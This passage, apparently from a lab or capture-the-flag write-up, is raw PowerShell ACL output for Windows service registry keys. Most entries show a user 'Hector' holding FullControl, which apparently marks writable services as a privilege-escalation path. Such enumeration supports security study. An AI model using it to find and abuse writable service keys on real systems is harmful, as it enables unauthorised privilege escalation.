Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DevQueryBroker</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DevQueryBroker</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Dfs</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Dfs</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Dfsc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Dfsc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DFSR</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DFSR</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Dhcp</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Dhcp</span><br><span class="line">                          BUILTIN\Users Allow  -2147483648</span><br><span class="line">                          BUILTIN\Users Allow  ReadKey</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\diagnosticshub.standardcollector.service</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\diagnosticshub.standardcollector.service</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DiagTrack</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DiagTrack</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Disk</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Disk</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DmEnrollmentSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DmEnrollmentSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\dmvsc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\dmvsc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\dmwappushservice</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\dmwappushservice</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DNS</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DNS</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Dnscache</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Dnscache</span><br><span class="line">                          BUILTIN\Users Allow  ReadKey</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DoSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DoSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\dot3svc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\dot3svc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DPS</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DPS</span><br><span class="line">                          BUILTIN\Users Allow  ReadKey</span><br><span class="line">                          BUILTIN\Users Allow  -1610612736</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\drmkaud</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\drmkaud</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DsmSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DsmSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DsSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DsSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DXGKrnl</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DXGKrnl</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\e1iexpress</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\e1iexpress</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Eaphost</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Eaphost</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ebdrv</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ebdrv</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\EFS</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\EFS</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\EhStorClass</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\EhStorClass</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\EhStorTcgDrv</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\EhStorTcgDrv</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\elxfcoe</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\elxfcoe</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\elxstor</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\elxstor</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\embeddedmode</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\embeddedmode</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\EntAppSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\EntAppSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ErrDev</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ErrDev</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ESENT</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ESENT</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\EventLog</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\EventLog</span><br><span class="line">AccessToString          : NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  -2147483648</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\EventSystem</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\EventSystem</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\exfat</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\exfat</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\fastfat</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\fastfat</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\fcvsc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\fcvsc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\fdc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\fdc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\fdPHost</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\fdPHost</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\FDResPub</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\FDResPub</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\FileCrypt</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\FileCrypt</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\FileInfo</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\FileInfo</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Filetrace</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Filetrace</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\flpydisk</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\flpydisk</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\FltMgr</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\FltMgr</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\FontCache</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\FontCache</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\FrameServer</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\FrameServer</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\FsDepends</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\FsDepends</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Fs_Rec</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Fs_Rec</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\gencounter</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\gencounter</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\genericusbfn</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\genericusbfn</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\GPIOClx0101</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\GPIOClx0101</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\gpsvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\gpsvc</span><br><span class="line">                          BUILTIN\Users Allow  ReadKey</span><br><span class="line">                          BUILTIN\Users Allow  -1610612736</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\GraphicsPerfSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\GraphicsPerfSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\HdAudAddService</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : 